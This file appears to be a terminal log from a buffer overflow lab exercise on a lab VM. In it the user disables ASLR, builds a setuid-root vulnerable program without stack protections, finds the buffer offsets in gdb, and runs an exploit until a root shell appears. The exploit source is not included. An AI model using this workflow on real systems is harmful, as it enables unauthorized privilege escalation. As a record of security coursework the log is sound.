@@ -1,0 +1,196 @@
+[11/28/22]seed@VM:~$ cd '/home/seed/Desktop/dva' 
+[11/28/22]seed@VM:~/.../dva$ sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+[11/28/22]seed@VM:~/.../dva$ gcc -fno-stack-protector call_shellcode.c
+call_shellcode.c: In function ‘main’:
+call_shellcode.c:24:4: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+    strcpy(buf, code);
+    ^
+call_shellcode.c:24:4: warning: incompatible implicit declaration of built-in function ‘strcpy’
+call_shellcode.c:24:4: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
+[11/28/22]seed@VM:~/.../dva$ gcc -z execstack -o call_shellcode call_shellcode.c
+call_shellcode.c: In function ‘main’:
+call_shellcode.c:24:4: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+    strcpy(buf, code);
+    ^
+call_shellcode.c:24:4: warning: incompatible implicit declaration of built-in function ‘strcpy’
+call_shellcode.c:24:4: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
+[11/28/22]seed@VM:~/.../dva$ gcc -z execstack -o call_shellcode call_shellcode.c
+call_shellcode.c: In function ‘main’:
+call_shellcode.c:24:4: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+    strcpy(buf, code);
+    ^
+call_shellcode.c:24:4: warning: incompatible implicit declaration of built-in function ‘strcpy’
+call_shellcode.c:24:4: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
+[11/28/22]seed@VM:~/.../dva$ ./call_shellcode 
+$ sudo su                                                                      
+root@VM:/home/seed/Desktop/dva# exit
+exit
+$ exit                                                                         
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=N -o stack -z execstack -fno-stack-protector stack.c
+stack.c: In function ‘bof’:
+<command-line>:0:10: error: ‘N’ undeclared (first use in this function)
+stack.c:18:17: note: in expansion of macro ‘BUF_SIZE’
+     char buffer[BUF_SIZE];
+                 ^
+<command-line>:0:10: note: each undeclared identifier is reported only once for each function it appears in
+stack.c:18:17: note: in expansion of macro ‘BUF_SIZE’
+     char buffer[BUF_SIZE];
+                 ^
+stack.c: In function ‘main’:
+<command-line>:0:10: error: ‘N’ undeclared (first use in this function)
+stack.c:33:16: note: in expansion of macro ‘BUF_SIZE’
+     char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);
+                ^
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+chown: cannot access 'stack': No such file or directory
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=24 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=24 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=14 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=34 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=520 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Returned Properly
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=517 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack 
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=24 -o stack -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ sudo chown root stack
+[11/28/22]seed@VM:~/.../dva$ sudo chmod 4755 stack
+[11/28/22]seed@VM:~/.../dva$ gcc -DBUF_SIZE=24 -o stackDebug -g -z execstack -fno-stack-protector stack.c
+[11/28/22]seed@VM:~/.../dva$ gdb stackDebug 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from stackDebug...done.
+gdb-peda$ b bof
+Breakpoint 1 at 0x80484f1: file stack.c, line 21.
+gdb-peda$ r
+Starting program: /home/seed/Desktop/dva/stackDebug 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xbfffea57 --> 0x90909090 
+EBX: 0x0 
+ECX: 0x804fb20 --> 0x0 
+EDX: 0x205 
+ESI: 0xb7f1c000 --> 0x1b1db0 
+EDI: 0xb7f1c000 --> 0x1b1db0 
+EBP: 0xbfffea18 --> 0xbfffec68 --> 0x0 
+ESP: 0xbfffe9f0 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
+EIP: 0x80484f1 (<bof+6>:	sub    esp,0x8)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484eb <bof>:	push   ebp
+   0x80484ec <bof+1>:	mov    ebp,esp
+   0x80484ee <bof+3>:	sub    esp,0x28
+=> 0x80484f1 <bof+6>:	sub    esp,0x8
+   0x80484f4 <bof+9>:	push   DWORD PTR [ebp+0x8]
+   0x80484f7 <bof+12>:	lea    eax,[ebp-0x20]
+   0x80484fa <bof+15>:	push   eax
+   0x80484fb <bof+16>:	call   0x8048390 <strcpy@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffe9f0 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
+0004| 0xbfffe9f4 --> 0x0 
+0008| 0xbfffe9f8 --> 0xb7f1c000 --> 0x1b1db0 
+0012| 0xbfffe9fc --> 0xb7b62940 (0xb7b62940)
+0016| 0xbfffea00 --> 0xbfffec68 --> 0x0 
+0020| 0xbfffea04 --> 0xb7feff10 (<_dl_runtime_resolve+16>:	pop    edx)
+0024| 0xbfffea08 --> 0xb7dc888b (<__GI__IO_fread+11>:	add    ebx,0x153775)
+0028| 0xbfffea0c --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, bof (str=0xbfffea57 '\220' <repeats 200 times>...) at stack.c:21
+21	    strcpy(buffer, str);       
+gdb-peda$ p $ebp
+$1 = (void *) 0xbfffea18
+gdb-peda$ p &buffer
+$2 = (char (*)[24]) 0xbfffe9f8
+gdb-peda$ exit
+Undefined command: "exit".  Try "help".
+gdb-peda$ q
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+exploit.c: In function ‘main’:
+exploit.c:32:18: error: conflicting types for ‘buffer’
+     unsigned int buffer = 0xbfffe9f8;
+                  ^
+exploit.c:24:10: note: previous declaration of ‘buffer’ was here
+     char buffer[517];
+          ^
+exploit.c:34:12: warning: passing argument 1 of ‘memcpy’ makes pointer from integer without a cast [-Wint-conversion]
+     memcpy(buffer + 517 - stackSize, shellcode, stackSize);
+            ^
+In file included from exploit.c:6:0:
+/usr/include/string.h:42:14: note: expected ‘void * restrict’ but argument is of type ‘unsigned int’
+ extern void *memcpy (void *__restrict __dest, const void *__restrict __src,
+              ^
+exploit.c:37:12: warning: passing argument 1 of ‘memcpy’ makes pointer from integer without a cast [-Wint-conversion]
+     memcpy(buffer + offset, &retur, 4);
+            ^
+In file included from exploit.c:6:0:
+/usr/include/string.h:42:14: note: expected ‘void * restrict’ but argument is of type ‘unsigned int’
+ extern void *memcpy (void *__restrict __dest, const void *__restrict __src,
+              ^
+exploit.c:41:12: warning: passing argument 1 of ‘fwrite’ makes pointer from integer without a cast [-Wint-conversion]
+     fwrite(buffer, 517, 1, badfile);
+            ^
+In file included from exploit.c:5:0:
+/usr/include/stdio.h:715:15: note: expected ‘const void * restrict’ but argument is of type ‘unsigned int’
+ extern size_t fwrite (const void *__restrict __ptr, size_t __size,
+               ^
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ gcc -o exploit exploit.c
+[11/28/22]seed@VM:~/.../dva$ ./stack
+Segmentation fault
+[11/28/22]seed@VM:~/.../dva$ ./exploit 
+[11/28/22]seed@VM:~/.../dva$ ./stack
+#
+
